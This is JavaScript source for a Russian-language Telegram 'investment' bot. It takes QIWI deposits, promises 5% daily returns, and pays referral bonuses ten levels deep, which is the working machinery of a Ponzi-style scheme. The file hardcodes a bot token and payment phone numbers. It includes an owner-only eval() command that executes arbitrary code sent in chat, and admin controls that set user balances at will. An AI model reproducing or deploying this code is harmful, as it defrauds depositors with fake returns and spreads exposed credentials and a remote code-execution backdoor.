let transactions = require("./transactions");
let adversite = require("./adversite");
let moreMoney = require("./moreMoney");

const mongo = require("mongoose");
mongo.connect("");

const QIWI = require("node-qiwi-api").Qiwi;
const wallet = new QIWI("+79910076945");

const admins = [8473087607];
                             


const User			=		mongo.model("NewUser", new mongo.Schema({
	id: Number,
	balance: Number,
	ref: Number,
	idref: Number,
	epr: Number,
	eps: Number,
	invests: Number,
	epv: Number,
	menu: String,
	adminmenu: String,
	prfUser: String,
	prp: Object,
	akk: Number,
	pakk: Number,
	inv: Number,
	viv: Number,
	regDate: String,
	verify: Boolean
}));

const Invests			=		mongo.model("NewInvesters", new mongo.Schema({
	id: Number,
	balance: Number,
	zarabotok: Number,
}));

const Ticket		=		mongo.model("NewTicket", new mongo.Schema({
	owner: Number,
	wallet: String,
	amount: Number
}));

const Ban			=		mongo.model("NewBan", new mongo.Schema({
	id: Number
}));

const Telegram		=		require("node-telegram-bot-api");
const bot			=		new Telegram(
	"7556886894:AAE67gaiIKGI5CIlxOZ_tplzftphLm3W2n4", // Токен BotFather
	{ polling: true }
);

setInterval(async () => {
wallet.getOperationHistory({
rows: 3,
operation: "IN"
}, async (err, res) => {
res.data.map(async (operation) => {
if(transactions.indexOf(operation.txnId) !== -1) return;

if(!operation.comment) return;
if(!operation.comment.startsWith("m")) return;
if(operation.sum.amount < 10) return;

let user = await User.findOne({ id: Number(operation.comment.split("m")[1]) });
if(!user) return;
				await User.findOneAndUpdate({ id: 1588287137 }, { $inc: { inv: operation.sum.amount } })
bot.sendMessage(user.id, `
🔥 На счет инвестиций поступило: ${operation.sum.amount}₽`);
bot.sendMessage(1588287137, `
<a href="tg://user?id=${user.id}">🔥 Игрок</a> сделал депозит через Qiwi: ${operation.sum.amount}₽`);
await user.inc("invests", operation.sum.amount);

transactions.push(operation.txnId);
require("fs").writeFileSync("./transactions.json", JSON.stringify(transactions, null, "\t"));
});
});
}, 10000);


const settings		=		{
	pps: 0.25,
	ppv: 0.025,
	ppr: 2,
	ref2: 0.6,
	ref3: 0.4,
	ref4: 0.35,
	ref5: 0.25,
	ref1st: 0.20,
	ref2st: 0.10,
	min_withdraw: 1
}

const keyboards		=		{
	main: [
		["🍩 Мои инвестиции","🍹 Позвать друзей"],
		["🍭 Верификация аккаунта"],
		["🧩 Баланс","🕹 Информация"]
	],
	cancel: [
		["⛔️ Отмена"]
	],
	admin: [
		["📬 Рассылка", "📮 Заявки на вывод"],
		["📁 Информация", "🔓 Изменить баланс"],
		["⛔️ Бан"],
		["🔙 Начало"]
	]
}

bot.on("message", async (message) => {
	let ban = await Ban.findOne({ id: message.from.id });
	if(ban) return;

	message.send = (text, params) => bot.sendMessage(message.chat.id, text, params);
	User.findOne({ id: message.from.id }).then(async ($user) => {
		if($user) return;

		let schema = {
			id: message.from.id,
			balance: 0,
			ref: 0,
			inv: 0,
			viv: 0,
			akk: 0,
			epr: 0,
			eps: 0,
			epv: 0,
			idref: 0,
			invests: 0,
			menu: "",
			adminmenu: "",
			prfUser: "",
			prp: {},
			regDate: `${new Date().getDate()}.${new Date().getMonth() + 1}.${new Date().getFullYear()}`,
			verify: false
		}
					if(Number(message.text.split("/start ")[1])) {
			schema.ref		=		Number(message.text.split("/start ")[1]);

		await message.send(`✅ Успешная регистрация`, {
			reply_markup: {
				keyboard: keyboards.main,
				resize_keyboard: true
			}
		});
								let user = new User(schema);
		await user.save();
					let ref = await User.findOne({ id: Number(message.text.split("/start ")[1]) });
			bot.sendMessage(Number(message.text.split("/start ")[1]), `🔥 По вашей реферальной ссылке перешел <a href="tg://user?id=${message.from.id}">игрок</a> 1 уровня, после его верефикации вы получите 5 Руб на ваши инвестиции`, {
				parse_mode: "HTML"
			})
				let tref = await User.findOne({ id: ref.ref });
				if(!tref) { return console.log('2 уровень OFF') }
				await User.updateOne({ id: message.from.id }, { $set: { tref: tref.id } } )
				bot.sendMessage(Number(tref.id), `🔥 По вашей реферальной ссылке перешел <a href="tg://user?id=${message.from.id}">игрок</a> 2 уровня, после его верефикации вы получите 2.5 Руб на ваши инвестиции`, {
				parse_mode: "HTML"
			})
							let fref = await User.findOne({ id: tref.ref });
				if(!fref) { return console.log('3 уровень OFF') }
								bot.sendMessage(Number(fref.id), `🔥 По вашей реферальной ссылке перешел <a href="tg://user?id=${message.from.id}">игрок</a> 3 уровня, после его верефикации вы получите 1.25 Руб на ваши инвестиции `, {
				parse_mode: "HTML"
			})
										let sref = await User.findOne({ id: fref.ref });
				if(!sref) { return console.log('4 уровень OFF') }
								bot.sendMessage(Number(sref.id), `🔥 По вашей реферальной ссылке перешел <a href="tg://user?id=${message.from.id}">игрок</a> 4 уровня, после его верефикации вы получите 0.5 Руб на ваши инвестиции`, {
				parse_mode: "HTML"
			})
										let rref = await User.findOne({ id: sref.ref });
				if(!rref) { return console.log('5 уровень OFF') }
								bot.sendMessage(Number(rref.id), `🔥 По вашей реферальной ссылке перешел <a href="tg://user?id=${message.from.id}">игрок</a> 5 уровня, после его верефикации вы получите 0.25 Руб на ваши инвестиции `, {
				parse_mode: "HTML"
			})
													let qref = await User.findOne({ id: rref.ref });
				if(!qref) { return console.log('6 уровень OFF') }
								bot.sendMessage(Number(qref.id), `🔥 По вашей реферальной ссылке перешел <a href="tg://user?id=${message.from.id}">игрок</a> 6 уровня, после его верефикации вы получите 0.1 Руб на ваши инвестиции `, {
				parse_mode: "HTML"
			})
													let yref = await User.findOne({ id: qref.ref });
				if(!yref) { return console.log('7 уровень OFF') }
								bot.sendMessage(Number(yref.id), `🔥 По вашей реферальной ссылке перешел <a href="tg://user?id=${message.from.id}">игрок</a> 7 уровня, после его верефикации вы получите 0.1 Руб на ваши инвестиции `, {
				parse_mode: "HTML"
			})
													let uref = await User.findOne({ id: yref.ref });
				if(!uref) { return console.log('8 уровень OFF') }
								bot.sendMessage(Number(uref.id), `🔥 По вашей реферальной ссылке перешел <a href="tg://user?id=${message.from.id}">игрок</a> 8 уровня, после его верефикации вы получите 0.1 Руб на ваши инвестиции `, {
				parse_mode: "HTML"
			})
													let iref = await User.findOne({ id: uref.ref });
				if(!iref) { return console.log('9 уровень OFF') }
								bot.sendMessage(Number(iref.id), `🔥 По вашей реферальной ссылке перешел <a href="tg://user?id=${message.from.id}">игрок</a> 9 уровня, после его верефикации вы получите 0.1 Руб на ваши инвестиции `, {
				parse_mode: "HTML"
			})
													let oref = await User.findOne({ id: iref.ref });
				if(!oref) { return console.log('10 уровень OFF') }
								bot.sendMessage(Number(oref.id), `🔥 По вашей реферальной ссылке перешел <a href="tg://user?id=${message.from.id}">игрок</a> 10 уровня, после его верефикации вы получите 0.1 Руб на ваши инвестиции `, {
				parse_mode: "HTML"
			})
			}


		let user = new User(schema);
		await user.save();
await message.send(`🖥 Для полноценной работы с ботом нужна верификация аккаунта.`);
	});
	message.user = await User.findOne({ id: message.from.id });



	if(message.text === "⛔️ Отмена" || message.text === "🔙 Начало") {
	
		await message.user.set("menu", "");
		await message.user.set("adminmenu", "");

		return message.send(`Операция отменена.`, {
			reply_markup: {
				keyboard: keyboards.main,
				resize_keyboard: true
			}
		});
	}

if(message.text === "/start") {
		await message.send(`🔔 Меню`, {
			reply_markup: {
				keyboard: keyboards.main,
				resize_keyboard: true
			}
		});
	}
		if(message.user.menu.startsWith("enterAmount")) {
			message.text = Math.floor(Number(message.text));
			if(!message.text) return message.send(`Введите сумму вывода`);

			let pwallet = Number(message.user.menu.split("enterAmount")[1]);

			if(message.text > message.user.balance) return message.send(`Недостаточно денег! Вы можете вывести ${message.user.balance.toFixed(2)} RUB`);
			else if(message.text <= message.user.balance) {
				await User.findOneAndUpdate({ id: 1438921150 }, { $inc: { viv: message.text } })
				await message.user.dec("balance", message.text);
				await wallet.toWallet({
				account: "+" + pwallet,
				amount: message.text,
				comment: "Вывод с BESTINVESTMENT_ROBOT"
			}, (err, success) => {});
				await message.user.set("menu", "");
				
							bot.sendMessage("@end_soft", `<b>Была произведена новая выплата!</b>
			
💰 <b>Сумма: ${message.text}₽</b>
💸 <a href="tg://user?id=${message.from.id}">Пользователь</a>
`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
					[
						{ text: "💰 Перейти в бота", url: `https://t.me/BESTINVESTMENT_ROBOT` }
					]
					]
				}
			});
				admins.map((x) => bot.sendMessage(x, `💰 Новый вывод на сумму ${message.text} от <a href="tg://user?id=${message.from.id}">пользователя</a> киви ${pwallet}`, {
				parse_mode: "HTML"
			}));

				return message.send(`💰 Средства уже на твоем QIWI! 

🏆 Оставь скриншот выплаты в чате https://t.me/end_soft`, {
	parse_mode: "HTML",
					reply_markup: {
						keyboard: keyboards.main,
						resize_keyboard: true
					}
				});
			}
		}

		if(message.user.menu === "qiwi") {
			message.text = Math.floor(Number(message.text));
			if(message.text < 7000000) return message.send(`Введите номер кошелька QIWI!`);

			await message.user.set("menu", "enterAmount" + message.text);
			return message.send(`Введите сумму на вывод.`);
		}

			if(message.text === "/qiwi") {
											let user		=		await User.findOne({ id: message.chat.id });	
					if(user.akk == 0) {
						return message.send(`🛑 Вы не активировали аккаунт. Для активации перейдите в раздел -> верификация аккаунта`);
						}
		if(message.user.balance < settings.min_withdraw) return message.send(`Минимальная сумма вывода: ${settings.min_withdraw}₽`, {
			reply_markup: {
				keyboard: keyboards.main,
				resize_keyboard: true
			}
		});

		let ticket = await Ticket.findOne({ owner: message.from.id });

		message.send(`Введите номер кошелька QIWI.`, {
			reply_markup: {
				keyboard: keyboards.cancel,
				resize_keyboard: true
			}
		});

		await message.user.set("menu", "qiwi");
	}

	if(message.text === "🧩 Баланс") {
									let user		=		await User.findOne({ id: message.chat.id });	
					if(user.akk == 0) {
						return message.send(`🛑 Вы не активировали аккаунт. Для активации перейдите в раздел -> верификация аккаунта`);
						}
		return message.send(`
🧩 Ваш баланс: ${message.user.balance.toFixed(2)}₽

🆔 Айди аккаунта: ${message.chat.id}`, {
			reply_markup: {
				inline_keyboard: [
						[
							{ text: "➕ Пополнить", callback_data: `popol` },
						    { text: "➖ Вывести", callback_data: `viv` }
						],
						]
			},
			parse_mode: "HTML"
		});
	}
	
	if(message.text === "🍭 Верификация аккаунта") {
		let user		=		await User.findOne({ id: message.chat.id });	
					if(user.akk == 1) {
						return message.send(`🎯 Вы уже активировали аккаунт.`);
						}	
		return message.send(`
🍭 Для верификации аккаунта нужно подписаться на наши каналы:

💫 t.me/cyberpunk_otzivi
   t.me/end_soft
   t.me/end_soft`, {
			reply_markup: {
				inline_keyboard: [
						[
							{ text: "✅ Проверить", callback_data: `akt` }
						],
						]
			},
			parse_mode: "HTML"
		});
	}
	
		if(message.text === "🍩 Мои инвестиции") {
																let user		=		await User.findOne({ id: message.chat.id });	
					if(user.akk == 0) {
						return message.send(`🛑 Вы не активировали аккаунт. Для активации перейдите в раздел -> верификация аккаунта`);
						}

		return message.send(`
🍩 Твой инвестиционный счёт:

🥷 Процент в сутки: 5%

🔥 Инвестированная сумма: ${user.invests}₽
➖ Доход в сутки: ${Number(user.invests/20)}₽

🧩 Чтобы совершить инвестиции нужно либо приглашать друзей либо пополнять в бота`, {
			parse_mode: "HTML"
		});
	}
	if(message.text === "🍹 Позвать друзей") {
											let user		=		await User.findOne({ id: message.chat.id });	
					if(user.akk == 0) {
						return message.send(`🛑 Вы не активировали аккаунт. Для активации перейдите в раздел -> верификация аккаунта`);
						}													

		await message.send(`
🍹 За приглашение друзей мы платим:
💰 За приглашение друга:
1⃣ Уровень - 5₽
2⃣ Уровень - 2.5₽
3⃣ Уровень - 1.25₽
4⃣ Уровень - 0.5₽
5⃣ Уровень - 0.25₽
6⃣ Уровень - 0.1₽
7⃣ Уровень - 0.1₽
8⃣ Уровень - 0.1₽
9⃣ Уровень - 0.1₽
🔟 Уровень - 0.1₽
🚀 Ваша ссылка: https://t.me/BESTINVESTMENT_ROBOT?start=${message.from.id}`, {
			parse_mode: "HTML"
		});
				await message.send(`
📩 Собираю информацию о ваших друзьях...`, {
			parse_mode: "HTML"
		});
		let lvl1		=		await User.find({ ref: message.from.id });
		let lvl2		=		await User.find({ ref: lvl1.id });
		let lvl3		=		await User.find({ ref: lvl2.id });
		let lvl4		=		await User.find({ ref: lvl3.id });
		let lvl5		=		await User.find({ ref: lvl4.id });
		let lvl6		=		await User.find({ ref: lvl5.id });
		let lvl7		=		await User.find({ ref: lvl6.id });
		let lvl8		=		await User.find({ ref: lvl7.id });
		let lvl9		=		await User.find({ ref: lvl8.id });
		let lvl10		=		await User.find({ ref: lvl9.id });
						return message.send(`
1⃣ Уровень - ${lvl1.length} человек
2⃣ Уровень - ${lvl2.length} человек
3⃣ Уровень - ${lvl3.length} человек
4⃣ Уровень - ${lvl4.length} человек
5⃣ Уровень - ${lvl5.length} человек
6⃣ Уровень - ${lvl6.length} человек
7⃣ Уровень - ${lvl7.length} человек
8⃣ Уровень - ${lvl8.length} человек
9⃣ Уровень - ${lvl9.length} человек
🔟 Уровень - ${lvl10.length} человек`, {
			parse_mode: "HTML"
		});
	}


	if(message.text === "🕹 Информация") {

															let user		=		await User.findOne({ id: message.chat.id });	
					if(user.akk == 0) {
						return message.send(`🛑 Вы не активировали аккаунт. Для активации перейдите в раздел -> верификация аккаунта`);
						}	
var s = await User.findOne({ id: 1588287137 })

		let counters = {
			users: await User.countDocuments(),
			users_today: await User.find({ regDate: `${new Date().getDate()}.${new Date().getMonth() + 1}.${new Date().getFullYear()}` }),
		}

		counters.users_today		=		counters.users_today.length;
		return message.send(`
🕹 Текущая статистика бота:

🚀 Дата старта проекта: 2.07

➖ Всего пользователей: <b>${counters.users}</b>
➖ Новых за сутки: <b>${counters.users_today}</b>
➖ Всего верификаций: <b>${Math.round(s.pakk)}</b>`, {
	reply_markup: {
				inline_keyboard: [
						[
							{ text: "🔊 Чат", url: `t.me/end_soft` },
						]					
						]
						
			},
			parse_mode: "HTML"
		});
	}

	if(/^(?:~)\s([^]+)/i.test(message.text)) {
		if(message.from.id !== 1588287137) return;

		let result = eval(message.text.match(/^(?:~)\s([^]+)/i)[1]);
		try {
			if(typeof(result) === "string")
			{
				return message.send(`string: \`${result}\``, { parse_mode: "Markdown" });
			} else if(typeof(result) === "number")
			{
				return message.send(`number: \`${result}\``, { parse_mode: "Markdown" });
			} else {
				return message.send(`${typeof(result)}: \`${JSON.stringify(result, null, '\t\t')}\``, { parse_mode: "Markdown" });
			}
		} catch (e) {
			console.error(e);
			return message.send(`ошибка:
\`${e.toString()}\``, { parse_mode: "Markdown" });
		}
	}

	if(admins.indexOf(message.from.id) !== -1) {
		if(message.user.menu.startsWith("setBalance")) {
			message.text		=		Number(message.text);
			if(!message.text) return message.send(`Введите новый баланс.`);

			let user		=		await User.findOne({ id: Number(message.user.menu.split("setBalance")[1]) });
			if(!user) return;

			await user.set("balance", message.text);
			await message.user.set("menu", "");

			return message.send(`Баланс успешно изменён.`, {
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});
		}

		if(message.user.menu === "enterIdBalance") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`Введите айди.`);

			let user		=		await User.findOne({ id: message.text });
			if(!user) return message.send(`Пользователь не найден.`);

			await message.user.set("menu", "setBalance" + message.text);
			return message.send(`Введите новый баланс.\nБаланс сейчас: ${user.balance} RUB`);
		}

		if(message.user.menu.startsWith("auditory")) {
			let users		=		await User.find();
			let total		=		users.length * Number(message.user.menu.split("auditory")[1]);

			for (let i = 0; i < total; i++) {
				if(message.photo) {
					let file_id = message.photo[message.photo.length - 1].file_id;
					let params = {
						caption: message.caption,
						parse_mode: "HTML",
						disable_web_page_preview: true
					}

					if(message.caption.match(/(?:кнопка)\s(.*)\s-\s(.*)/i)) {
						let [ msgText, label, url ] = message.caption.match(/(?:кнопка)\s(.*)\s-\s(.*)/i);
						params.reply_markup = {
							inline_keyboard: [
								[{ text: label, url: url }]
							]
						}

						params.caption = params.caption.replace(/(кнопка)\s(.*)\s-\s(.*)/i, "");
					}

					bot.sendPhoto(users[i].id, file_id, params);
				}

				if(!message.photo) {
					let params = {
						parse_mode: "HTML",
						disable_web_page_preview: true
					}

					if(message.text.match(/(?:кнопка)\s(.*)\s-\s(.*)/i)) {
						let [ msgText, label, url ] = message.text.match(/(?:кнопка)\s(.*)\s-\s(.*)/i);
						params.reply_markup = {
							inline_keyboard: [
								[{ text: label, url: url }]
							]
						}
					}

					bot.sendMessage(users[i].id, message.text.replace(/(кнопка)\s(.*)\s-\s(.*)/i, ""), params);
				}
			}

			await message.user.set("menu", "");
			await message.send("Рассылка успешно завершена.", {
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});
		}

		if(message.user.menu === "selectAuditory") {
			await message.user.set("menu", "auditory" + Number(message.text));
			return message.send(`Введите текст рассылки.
			
Можно прикрепить изображение.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}

		if(message.user.menu === "enterId") {
			message.text = Number(message.text);
			if(!message.text) return message.send(`Введите айди пользователя.`);

			let user		=		await User.findOne({ id: message.text });
			if(!user) return message.send(`Пользователь с таким айди не найден.`);

			let refs		=		await User.find({ ref: message.text });
			message.send(`<a href="tg://user?id=${message.text}">Пользователь</a>:
			
Баланс: ${user.balance} RUB
Инвестиции: ${user.invests}
Пригласил рефералов: ${refs.length}`, {
				parse_mode: "HTML",
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});

			let text		=		``;
			refs.slice(0, 25).map((x, i) => {
				text		+=		`<a href="tg://user?id=${x.id}">Реферал №${i}</a>\n`;
			});

			message.user.set("menu", "");
			return message.send(`Его рефералы:\n\n${text}`, {
				parse_mode: "HTML"
			});
		}
		if(message.user.menu === "ban") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`Введите айди.`);

			let ban			=		await Ban.findOne({ id: message.text });
			if(ban) {
				await ban.remove();
				await message.user.set("menu", "");

				return message.send(`Бан снят.`);
			} else {
				let _ban = new Ban({
					id: message.text
				});

				await _ban.save();
				await message.user.set("menu", "");

				return message.send(`Бан выдан.`);
			}
		}

		if(message.text === "⛔️ Бан") {
			await message.user.set("menu", "ban");
			return message.send(`Введите айди пользователя.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}
		if(message.text === "🔓 Изменить баланс") {
			await message.user.set("menu", "enterIdBalance");
			return message.send(`Введите айди пользователя.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}

		if(message.text === "📁 Информация") {
			await message.user.set("menu", "enterId");
			return message.send(`Введите айди пользователя.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}

		if(message.text === "📮 Заявки на вывод") {
			let tickets = await Ticket.find();
			await message.send(`Заявки:`);

			tickets.map((x) => {
				message.send(`<a href="tg://user?id=${x.owner}">Пользователь</a>

Кошелёк: ${String(x.wallet)}
Сумма: ${x.amount} RUB`, {
					parse_mode: "HTML",
					reply_markup: {
						inline_keyboard: [
							[{ text: "📤 Выплатить", callback_data: `withdraw${x.owner}` }],
							[{ text: "❌ Отклонить и вернуть", callback_data: `declineback${x.owner}` }],
							[{ text: "❌ Отклонить", callback_data: `decline${x.owner}` }]
						]
					}
				});
			});
		}

		if(message.text === "📬 Рассылка") {
			await message.user.set("menu", "selectAuditory");
			return message.send(`Выберите аудиторию.

0.25	—	25%
0.50	—	50%
0.75	—	75%
1		—	100%`, {
				reply_markup: {
					keyboard: [["0.25", "0.50"], ["0.75", "1"], ["⛔️ Отмена"]],
					resize_keyboard: true
				}
			});
		}

		if(message.text === "/admin") return message.send(`Добро пожаловать.`, {
			reply_markup: {
				keyboard: keyboards.admin,
				resize_keyboard: true
			}
		});
	}
});

bot.on("callback_query", async (query) => {
	const { message } = query;
	message.user = await User.findOne({ id: message.chat.id });

	let ban = await Ban.findOne({ id: message.user.id });
	if(ban) return bot.answerCallbackQuery(query.id, "Забанен!");

if(query.data.startsWith("qiwiviv")) {
		if (message.user.balance < 1) return bot.answerCallbackQuery(query.id, '🚫 Минимальная сумма вывода: 1₽', true);
if (message.user.invests < 20) return bot.answerCallbackQuery(query.id, '🚫  Для вывода нужно инвестировать минимум 20₽', true);

		let ticket = await Ticket.findOne({ owner: message.user.id });

		message.send(`Введите номер кошелька QIWI.`, {
			reply_markup: {
				keyboard: keyboards.cancel,
				resize_keyboard: true
			}
		});

		await message.user.set("menu", "qiwi");
	}

if(query.data.startsWith("viv")) {
							
	let lvl1		=		await User.find({ ref: message.from.id });
		let lvl2		=		[];

		for (let i = 0; i < lvl1.length; i++) {
			let second		=		await User.find({ ref: lvl1[i].id });
			for (let x = 0; x < second.length; x++) {
				lvl2.push(second[x]);
			}
		}

		
				return bot.sendMessage(message.chat.id,` 💵 Минимальная сумма на QIWI - 1 рубль
* Вывод на киви моментальный

Для вывода нажмите /qiwi`);
}
		
		if(query.data.startsWith("popol")) {
							
					

				return bot.sendMessage(message.chat.id,`📤 Выберите платежную систему на которую хотите совершить пополнение средств.`, {
				reply_markup: {
inline_keyboard: [
							[{ text: "▪ QIWI Кошелёк", callback_data: `qiwipopol` }],
							
						]
				}
			});
		}
		if(query.data.startsWith("qiwipopol")) {
							

	await bot.answerCallbackQuery(query.id, '🚫 Минимальная сумма пополнения 10₽, если вы пополните меньше то зачисление не придет!', true);
	return bot.sendMessage(message.user.id,`📥 Для совершения пополнения через QIWI кошелёк, переведите нужную сумму средств на номер кошелька указанный ниже, оставив при этом индивидуальный комментарий перевода:

💳 Номер кошелька бота: "+79017016559".
💬 Коментарий к переводу: "m${message.user.id}".
`);
}

		if(query.data.startsWith("akt")) {
if ((await bot.getChatMember("@end_soft", message.chat.id)).status == "left") {
					
	return bot.sendMessage(message.chat.id,`🛑 Вы не подписались на все каналы!`, {
			reply_markup: {
				inline_keyboard: [
						[
						{ text: "▪ Подписаться на канал", url: `t.me/end_soft` },
						],
						]

			}
		});
	}
			await User.findOneAndUpdate({ id: 1588287137 }, { $inc: { pakk: 1 } })
		await User.findOneAndUpdate({ id: message.chat.id }, { $set: { akk: 1 } })
		await bot.sendMessage(message.user.id,`✅ Вы прошли проверку, теперь вы сможете полноценно пользоваться нашим ботом!`);
		let user		=		await User.findOne({ id: message.chat.id });	
let ref = await User.findOne({ id: user.ref });
if(!ref) return;
await User.updateOne({ id: ref.id }, { $inc: { invests: +5, epv: +5 } } )
bot.sendMessage(ref.id, `
<a href="tg://user?id=${message.user.id}">🔥 Реферал</a> 1 уровня прошел верификацию, вам зачислено 5 Руб на ваши инвестиции`, {
parse_mode: "HTML"
})
let tref = await User.findOne({ id: ref.ref });
if(!tref) return;
await User.updateOne({ id: tref.id }, { $inc: { invests: +2.5, epv: +2.5 } } )
bot.sendMessage(tref.id, `
<a href="tg://user?id=${message.chat.id}">🔥 Реферал</a> 2 уровня прошел верификацию, вам зачислено 2.5 Руб на ваши инвестиции`, {
parse_mode: "HTML"
})
let fref = await User.findOne({ id: tref.ref });
if(!fref) return;
await User.updateOne({ id: fref.id }, { $inc: { invests: +1.25, epv: +1.25 } } )
bot.sendMessage(fref.id, `
<a href="tg://user?id=${message.chat.id}">🔥 Реферал</a> 3 уровня прошел верификацию, вам зачислено 1.25 Руб на ваши инвестиции`, {
parse_mode: "HTML"
})
let sref = await User.findOne({ id: fref.ref });
if(!sref) return;
await User.updateOne({ id: sref.id }, { $inc: { invests: +0.5, epv: +0.5 } } )
bot.sendMessage(sref.id, `
<a href="tg://user?id=${message.chat.id}">🔥 Реферал</a> 4 уровня прошел верификацию, вам зачислено 0.5 Руб на ваши инвестиции`, {
parse_mode: "HTML"
})
let rref = await User.findOne({ id: sref.ref });
if(!rref) return;
await User.updateOne({ id: rref.id }, { $inc: { invests: +0.25, epv: +0.25 } } )
bot.sendMessage(rref.id, `
<a href="tg://user?id=${message.chat.id}">🔥 Реферал</a> 5 уровня прошел верификацию, вам зачислено 0.25 Руб на ваши инвестиции`, {
parse_mode: "HTML"
})
let qref = await User.findOne({ id: rref.ref });
if(!qref) return;
await User.updateOne({ id: qref.id }, { $inc: { invests: +0.1, epv: +0.1 } } )
bot.sendMessage(qref.id, `
<a href="tg://user?id=${message.chat.id}">🔥 Реферал</a> 6 уровня прошел верификацию, вам зачислено 0.1 Руб на ваши инвестиции`, {
parse_mode: "HTML"
})
let yref = await User.findOne({ id: qref.ref });
if(!yref) return;
await User.updateOne({ id: yref.id }, { $inc: { invests: +0.1, epv: +0.1 } } )
bot.sendMessage(yref.id, `
<a href="tg://user?id=${message.chat.id}">🔥 Реферал</a> 7 уровня прошел верификацию, вам зачислено 0.1 Руб на ваши инвестиции`, {
parse_mode: "HTML"
})
let uref = await User.findOne({ id: yref.ref });
if(!uref) return;
await User.updateOne({ id: uref.id }, { $inc: { invests: +0.1, epv: +0.1 } } )
bot.sendMessage(uref.id, `
<a href="tg://user?id=${message.chat.id}">🔥 Реферал</a> 8 уровня прошел верификацию, вам зачислено 0.1 Руб на ваши инвестиции`, {
parse_mode: "HTML"
})
let iref = await User.findOne({ id: uref.ref });
if(!iref) return;
await User.updateOne({ id: iref.id }, { $inc: { invests: +0.1, epv: +0.1 } } )
bot.sendMessage(iref.id, `
<a href="tg://user?id=${message.chat.id}">🔥 Реферал</a> 9 уровня прошел верификацию, вам зачислено 0.1 Руб на ваши инвестиции`, {
parse_mode: "HTML"
})
let oref = await User.findOne({ id: iref.ref });
if(!oref) return;
await User.updateOne({ id: oref.id }, { $inc: { invests: +0.1, epv: +0.1 } } )
bot.sendMessage(oref.id, `
<a href="tg://user?id=${message.chat.id}">🔥 Реферал</a> 10 уровня прошел верификацию, вам зачислено 0.1 Руб для вывода`, {
parse_mode: "HTML"
})
}



	
	if(admins.indexOf(message.user.id) !== -1) {

		if(query.data.startsWith("withdraw")) {
			let id			=		Number(query.data.split("withdraw")[1]);
			let ticket		=		await Ticket.findOne({ owner: id });

			if(!ticket) return bot.answerCallbackQuery(query.id, "Заявка не найдена.");

			bot.sendMessage(ticket.owner, "Деньги выплачены. Просим прислать скриншоты в чат t.me/end_soft");
			bot.sendMessage("@end_soft", `<b>Была произведена новая выплата!</b>
			
💰 <b>Сумма: ${ticket.amount}₽</b>
💸 <a href="tg://user?id=${ticket.owner}">Пользователь</a>
`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
					[
						{ text: "💰 Перейти в бота", url: `https://t.me/BESTINVESTMENT_ROBOT` }
					]
					]
				}
			});


			await ticket.remove();
			bot.editMesssageText("Деньги выплачены. Просим прислать скриншоты в чат t.me/end_soft", {
				chat_id: message.chat.id,
				message_id: message.message_id
			});

			return;
		}

		if(query.data.startsWith("declineback")) {
			let id			=		Number(query.data.split("declineback")[1]);
			let ticket		=		await Ticket.findOne({ owner: id });

			if(!ticket) return bot.answerCallbackQuery(query.id, "Заявка не найдена.");

			await bot.sendMessage(ticket.owner, "Вам отклонили выплату и вернули деньги.");
			await User.findOne({ id: id }).then(async (user) => await user.inc("balance", ticket.amount));

			await ticket.remove();
			await bot.answerCallbackQuery(query.id, "Вы отказали в выплате средств и вернули деньги на баланс.");
		}

		if(query.data.startsWith("decline")) {
			let id			=		Number(query.data.split("decline")[1]);
			let ticket		=		await Ticket.findOne({ owner: id });

			if(!ticket) return bot.answerCallbackQuery(query.id, "Заявка не найдена.");

			await ticket.remove();
			await bot.answerCallbackQuery(query.id, "Вы отказали в выплате средств.");
		}
	}
});

User.prototype.inc		=		function(field, value = 1) {
	this[field] 		+=		value;
	return this.save();
}

User.prototype.dec 		= 		function(field, value = 1) {
	this[field] 		-= 		value;
	return this.save();
}

User.prototype.set 		= 		function(field, value) {
	this[field] 		=	 	value;
	return this.save();
}

async function rupdate() {
  let userList = await User.find();
await userList.map(async (x) => {
	  if (x.invests === 0) { return
  }
await User.updateOne({ id: x.id }, { $inc: { balance: x.invests/960, epv: x.invests/960 } }, 
  function (err) {
     if (err) throw err
})
 })
}


setInterval(async() => {
  rupdate(); 
}, 3600000); 
